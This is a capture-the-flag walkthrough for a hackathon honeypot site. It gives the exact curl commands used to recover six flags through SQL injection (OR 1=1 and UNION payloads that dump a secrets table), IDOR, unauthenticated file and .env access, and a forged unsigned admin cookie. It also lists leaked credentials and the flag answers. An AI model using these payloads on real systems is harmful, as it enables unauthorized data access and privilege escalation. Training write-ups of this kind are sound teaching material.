# HoneyPot Holdings CTF – Flag Retrieval Guide

## Overview
This walkthrough records the exact commands I used on 1 November 2025 from the Codex CLI to recover all six known flags from `http://team54-honeypot.durhack.qwerty.technology:8080`. All commands assume you have network access to the target from the workstation (no proxy required).

---

## Flag 1 – Homepage Source Comment

1. Fetch the site landing page with `curl`:
   ```bash
   curl -i http://team54-honeypot.durhack.qwerty.technology:8080/
   ```
2. Inspect the HTML response (the flag is in a comment near the top of the document):
   ```
   <!-- FLAG: FLAG{source_code_never_lies} -->
   ```

---

## Flag 2 – SQL Injection on `POST /login`

The login form concatenates user input directly into a SQL query, so we can use a UNION-based payload to extract arbitrary tables.

1. (Optional) Confirm the injection point leaks data by sending an always-true condition:
   ```bash
   curl -s -d "username=' OR 1=1 -- &password=test" \
     http://team54-honeypot.durhack.qwerty.technology:8080/login
   ```
   The error banner lists user records, proving injectable SQL.

2. Dump the `secrets` table row containing the admin flag:
   ```bash
   curl -s --data-urlencode \
     "username=' UNION SELECT id, secret_key, secret_value FROM secrets LIMIT 1 OFFSET 2 -- -" \
     --data-urlencode "password=test" \
     http://team54-honeypot.durhack.qwerty.technology:8080/login | sed -n '112p'
   ```
   The response includes:
   ```
   Authentication failed for user: <strong>3 admin_flag FLAG{union_based_injection_reveals_secrets}</strong>
   ```

3. Record the flag:
   ```
   FLAG{union_based_injection_reveals_secrets}
   ```

---

## Flag 3 – IDOR in Dashboard

1. Authenticate using any valid session (e.g., the leaked `elliot_4430` credentials) or reuse the cookie from Flag 2.
2. Request another user’s dashboard directly by altering the `userid` parameter:
   ```bash
   curl -s -b session.txt \
     "http://team54-honeypot.durhack.qwerty.technology:8080/dashboard?userid=8080" |
     grep -n "FLAG"
   ```
3. The rendered page includes:
   ```
   FLAG{direct_access_via_idor_parameter}
   ```

---

## Flag 4 – Insecure File Access (Draft Statement)

1. While authenticated as any trader-level user, download the draft statement via the portal download endpoint:
   ```bash
   curl -i -b session.txt \
     "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3-draft.pdf"
   ```
2. The PDF body (or the saved file) contains:
   ```
   FLAG{directories_are_like_markets_they_go_up_and_down}
   ```

---

## Flag 5 – Exposed `.env` File

1. The webroot allows direct access to the environment file:
   ```bash
   curl -s http://team54-honeypot.durhack.qwerty.technology:8080/.env
   ```
2. The response reveals:
   ```
   FLAG{dotenv_exposure_via_directory_traversal}
   ```

---

## Flag 6 – Privilege Escalation via Unsigned Cookie

1. Notice `/debug` shares how the application builds the `auth_data` cookie (base64-encoded JSON with no signature).
   ```bash
   curl -s http://team54-honeypot.durhack.qwerty.technology:8080/debug | head
   ```
2. Forge a CEO cookie and request the restricted statement directly (no session cookie needed):
   ```bash
   curl -i \
     -H 'Cookie: auth_data=eyJ1c2VyX2lkIjo3Nzc3LCJ1c2VybmFtZSI6InJhbnNvbV83Nzc3Iiwicm9sZSI6ImNlbyJ9' \
     "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3.pdf"
   ```
3. The final PDF includes:
   ```
   FLAG{admin_access_confirmed_privilege_escalation_successful}
   ```

---

## Notes
- Flags 1, 5, and 6 are reachable without a valid session; the others require any trader-level login (`elliot_4430` works).
- The UNION payload can enumerate additional secrets by adjusting the `OFFSET` value.
- Always sanitize inputs in production code—parameterized queries would prevent this issue.
